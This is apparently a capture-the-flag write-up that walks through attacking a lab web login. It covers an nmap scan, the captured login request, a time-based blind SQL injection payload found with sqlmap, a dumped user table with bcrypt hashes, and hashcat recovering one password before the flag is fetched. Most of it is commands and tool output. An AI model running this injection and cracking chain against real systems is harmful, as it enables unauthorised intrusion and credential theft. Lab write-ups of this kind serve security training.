SCAN NMAP:

nmap -sC -sV -p- 10.124.249.17

22/tcp open  ssh    
80/tcp open  http    nginx 1.18.0


Check website, we are have login page:

Check in Burp Suite our Request to login:

POST /auth/login HTTP/1.1
Host: 10.124.249.17
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
HX-Request: true
HX-Target: errorBlock
HX-Current-URL: http://10.124.249.17/auth/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: http://10.124.249.17
Connection: keep-alive
Referer: http://10.124.249.17/auth/login
Priority: u=0

email=besper%40besper.com&password=123123

Check this request on SQLi, add ' in email ground.

email=besper%40besper.com'&password=123123

Status Code response - 200. SQLi approved!

Automatically check SQLi with SQLMap:
sqlmap -r req.txt --batch

OUTPUT:
[INFO] checking if the injection point on POST parameter 'email' is a false positive
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 113 HTTP(s) requests:
---
Parameter: email (POST)
    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: email=besper@besper.com' AND 4897=(SELECT 4897 FROM PG_SLEEP(5)) AND 'Xere'='Xere&password=123123
---
[INFO] the back-end DBMS is PostgreSQL


sqlmap -r req.txt -p email --dbms=postgresql --dbs --batch --dump
<SNIP>
We are have SQLi Flag and credentials:
1  | homer_simpson@rawmatex.ru | $2a$10$z8OknjAIXN2xH/rOzACQPehdCjdY3g2eyMCuQS969RuE80a0FRuO6 |
2  | guts_berserk@rawmatex.ru  | $2a$10$QZycI7yZHBcwkclmOp3vxe/6I2Z1X8ZYNnxy/.JG1LSWo..eLz4Eu |
Decrypt this hash with hascat tool:
Session..........: hashcat
Status...........: Running
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$z8OknjAIXN2xH/rOzACQPehdCjdY3g2eyMCuQS969RuE...0FRuO6
Time.Started.....: Thu Oct 29 23:37:47 2026 (5 mins, 41 secs)
Time.Estimated...: Fri Oct 30 21:51:05 2026 (22 hours, 7 mins)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (/home/kali/Desktop/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:      179 H/s (9.93ms) @ Accel:8 Loops:32 Thr:1 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 61120/14344384 (0.43%)
Rejected.........: 0/61120 (0.00%)
Restore.Point....: 61120/14344384 (0.43%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:32-64
Candidate.Engine.: Device Generator
Candidates.#01...: 080707 -> 040704
Hardware.Mon.#01.: Util: 87%

$2a$10$z8OknjAIXN2xH/rOzACQPehdCjdY3g2eyMCuQS969RuE80a0FRuO6:makemoney1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$z8OknjAIXN2xH/rOzACQPehdCjdY3g2eyMCuQS969RuE...0FRuO6
Time.Started.....: Thu Oct 29 23:37:47 2026 (11 mins, 12 secs)
Time.Estimated...: Thu Oct 29 23:48:59 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (/home/kali/Desktop/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:      183 H/s (9.88ms) @ Accel:8 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 123264/14344384 (0.86%)
Rejected.........: 0/123264 (0.00%)
Restore.Point....: 123200/14344384 (0.86%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#01...: mamaaremere -> lynn1986
Hardware.Mon.#01.: Util: 89%

PASSSWORD - makemoney1

LOGIN -> Documents -> Download file export_contract.md. Inside flag to NS.

Thanks for watching!

